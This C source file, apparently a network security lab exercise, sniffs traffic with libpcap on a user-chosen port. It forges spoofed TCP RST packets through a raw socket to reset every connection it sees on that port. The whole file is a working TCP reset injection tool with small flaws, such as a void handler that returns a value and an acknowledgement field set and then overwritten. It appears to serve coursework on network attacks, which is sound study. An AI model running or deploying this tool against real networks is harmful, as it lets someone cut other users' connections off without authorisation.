#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
// VM IP adress and port 192.168.56.101 1234

struct pseudo_tcp_header {
    u_int32_t source;
    u_int32_t dest;
    u_int8_t reserved;
    u_int8_t protocol;
    u_int16_t len;
};

pcap_t *handle = NULL;
int sock_fd = -1;
uint16_t target_port = 0;
char *dev = NULL;
int rst = 0;


/* the checksum function is the same one from the header.c file provided in the template of tutorial 4a */

unsigned short checksum(unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}


void send_rst_packet(struct iphdr *iph, struct tcphdr *tcph) {
    struct sockaddr_in target;
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_tcp_header pseudo_h_tcp;

    int buf_len = ntohs(iph->tot_len) - iph->ihl * 4 - tcph->doff * 4;

    if (buf_len < 0 || buf_len > 1500) {
        buf_len = 0;
    }

    // IP header
    memset(ip, 0, sizeof(struct iphdr));
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip->id = htons(rand() % 65535);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = iph->daddr;
    ip->daddr = iph->saddr;
    ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));

    // TCP header
    memset(tcp, 0, sizeof(struct tcphdr));
    tcp->source = tcph->dest;
    tcp->dest = tcph->source;
    tcp->seq = htonl(ntohl(tcph->ack_seq));
    tcp->ack_seq = htonl(ntohl(tcp->seq) + buf_len);
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->rst = 1;
    tcp->ack = 1;
    tcp->window = htons(0);
    tcp->urg_ptr = 0;
    tcp->check = 0;


    // Pseudo-header 
    memset(&pseudo_h_tcp, 0, sizeof(pseudo_h_tcp));
    pseudo_h_tcp.source = ip->saddr;
    pseudo_h_tcp.dest = ip->daddr;
    pseudo_h_tcp.reserved = 0;
    pseudo_h_tcp.protocol = IPPROTO_TCP;
    pseudo_h_tcp.len = htons(sizeof(struct tcphdr));
    int pseudo_len = sizeof(pseudo_h_tcp) + sizeof(struct tcphdr);
    char *pseudo_buf = malloc(pseudo_len);

    memcpy(pseudo_buf, &pseudo_h_tcp, sizeof(pseudo_h_tcp));
    memcpy(pseudo_buf + sizeof(pseudo_h_tcp), tcp, sizeof(struct tcphdr));

    tcp->check = checksum((unsigned short*)pseudo_buf, pseudo_len);
    free(pseudo_buf);
    
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = iph->saddr;

    if (sendto(sock_fd, packet, sizeof(packet), 0,
               (struct sockaddr *)&target, sizeof(target)) < 0) {
        perror("Failed to send rst packet");
    } else {
        printf("Connection closed.\n");
    }
}

void handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    int offset = 0;
    int link_type = pcap_datalink(handle);
    if (link_type == DLT_EN10MB) offset = 14;
    else if (link_type == DLT_LINUX_SLL) offset = 16;
    else {
        fprintf(stderr, "Unsupported  type: %d\n", link_type);
        return 1;
    }

    struct iphdr *iph = (struct iphdr *)(packet + offset);
    if (iph->protocol != IPPROTO_TCP) return;

    struct tcphdr *tcph = (struct tcphdr *)(packet + offset + iph->ihl * 4);

    if (ntohs(tcph->dest) == target_port) {
        send_rst_packet(iph, tcph);
    }
}

int main() {

    char errbuf[PCAP_ERRBUF_SIZE], filter[64];
    struct bpf_program fp;
    bpf_u_int32 net = 0;
     
    printf("Target port: ");
    scanf("%hu", &target_port);

    dev = strdup("any");
    snprintf(filter, sizeof(filter), "tcp port %d", target_port);
    
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
        return 1;
    }

    if (pcap_compile(handle, &fp, filter, 0, net) == -1 || pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Filter error: %s\n", pcap_geterr(handle));
        return 1;
    }

    sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock_fd < 0) {
        perror("Socket error");
        return 1;
    }

    int seven = 6;
    if (setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, &seven, sizeof(seven)) < 0) {
        perror("setsockopt IP_HDRINCL failed");
        return 1;
    }

    printf("\n* Listening on %s for port %d traffic...\n", dev, target_port);
    pcap_loop(handle, 0, handler, NULL);

    return 0;
}